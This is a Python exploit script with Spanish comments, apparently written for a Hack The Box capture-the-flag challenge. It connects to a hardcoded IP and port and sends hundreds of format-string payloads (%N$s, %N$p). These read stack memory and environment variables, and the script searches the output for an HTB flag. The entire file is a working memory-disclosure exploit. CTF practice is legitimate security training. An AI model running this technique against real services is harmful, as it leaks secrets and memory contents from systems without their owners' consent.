#!/usr/bin/env python3

import socket
import time
import re

def connect_and_send_payload(payload):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect(('94.237.57.211', 45459))
        
        # Recibir menú
        data = s.recv(4096)
        
        # Enviar selección (usar 100 para activar ambas vulnerabilidades)
        s.send(b"100\n")
        
        # Recibir confirmación
        data = s.recv(4096)
        
        # Enviar payload
        s.send((payload + "\n").encode())
        
        # Recibir respuesta
        data = s.recv(4096).decode()
        
        # Extraer resultado
        if "[Description]" in data:
            result = data.split("[Description]")[1].strip()
            return result
        
        s.close()
        return None
        
    except Exception as e:
        return None

def search_for_flag_patterns():
    """Busca patrones de flag usando diferentes técnicas de format string"""
    
    print("Buscando patrones de flag con format strings avanzados...")
    
    # Técnicas para buscar strings en memoria
    techniques = []
    
    # Leer strings desde diferentes posiciones del stack
    for i in range(1, 200):
        techniques.append(f"%{i}$s")
    
    # Leer valores como punteros y luego como strings
    for i in range(1, 50):
        techniques.append(f"%{i}$p")
    
    found_flags = []
    
    for i, technique in enumerate(techniques):
        if i % 10 == 0:
            print(f"Progreso: {i}/{len(techniques)}")
        
        result = connect_and_send_payload(technique)
        if result:
            # Buscar patrones de flag
            if re.search(r'HTB\{.*\}', result, re.IGNORECASE):
                print(f"*** FLAG ENCONTRADA CON {technique}: {result} ***")
                found_flags.append((technique, result))
            elif re.search(r'\{.*\}', result):
                print(f"*** POSIBLE FLAG CON {technique}: {result} ***")
                found_flags.append((technique, result))
            elif any(pattern in result.lower() for pattern in ['htb', 'flag', 'ctf']):
                print(f"*** PATRÓN INTERESANTE CON {technique}: {result[:100]} ***")
                found_flags.append((technique, result))
        
        time.sleep(0.05)  # Para no saturar el servidor
    
    return found_flags

def read_environment_variables():
    """Intenta leer variables de entorno usando format strings"""
    
    print("\nBuscando variables de entorno...")
    
    # Las variables de entorno suelen estar en posiciones altas del stack
    for i in range(100, 300):
        payload = f"%{i}$s"
        result = connect_and_send_payload(payload)
        
        if result and len(result) > 0:
            print(f"Env[{i}]: {result[:100]}")
            
            # Buscar patrones de flag
            if re.search(r'HTB\{.*\}', result, re.IGNORECASE):
                print(f"*** FLAG EN VARIABLE DE ENTORNO: {result} ***")
                return result
            elif 'FLAG' in result.upper() or 'HTB' in result.upper():
                print(f"*** POSIBLE FLAG EN VARIABLE: {result} ***")
        
        time.sleep(0.1)
    
    return None

def dump_memory_systematically():
    """Dump sistemático de memoria buscando strings"""
    
    print("\nDump sistemático de memoria...")
    
    interesting_data = []
    
    # Leer memoria como strings desde diferentes offsets
    for offset in range(1, 100):
        payload = f"%{offset}$s"
        result = connect_and_send_payload(payload)
        
        if result and len(result) > 3:  # Solo strings de más de 3 caracteres
            # Filtrar strings que parezcan interesantes
            if any(char in result for char in '{}[]()'):
                print(f"String interesante en offset {offset}: {result[:50]}")
                interesting_data.append((offset, result))
                
                # Buscar flag
                if re.search(r'HTB\{.*\}', result, re.IGNORECASE):
                    print(f"*** FLAG ENCONTRADA: {result} ***")
                    return result
        
        time.sleep(0.05)
    
    return interesting_data

if __name__ == "__main__":
    print("Exploit avanzado de format string para buscar la flag...")
    
    # Buscar patrones de flag
    flags = search_for_flag_patterns()
    if flags:
        print("\n=== FLAGS ENCONTRADAS ===")
        for technique, flag in flags:
            print(f"{technique}: {flag}")
        
        # Si encontramos algo, terminamos
        if any('HTB{' in flag[1] for flag in flags):
            exit(0)
    
    # Buscar en variables de entorno
    env_flag = read_environment_variables()
    if env_flag:
        print(f"\n*** FLAG FINAL: {env_flag} ***")
        exit(0)
    
    # Dump sistemático
    interesting = dump_memory_systematically()
    if isinstance(interesting, str):  # Si retornó una flag
        print(f"\n*** FLAG FINAL: {interesting} ***")
    elif interesting:
        print("\n=== DATOS INTERESANTES ===")
        for offset, data in interesting:
            print(f"Offset {offset}: {data[:100]}")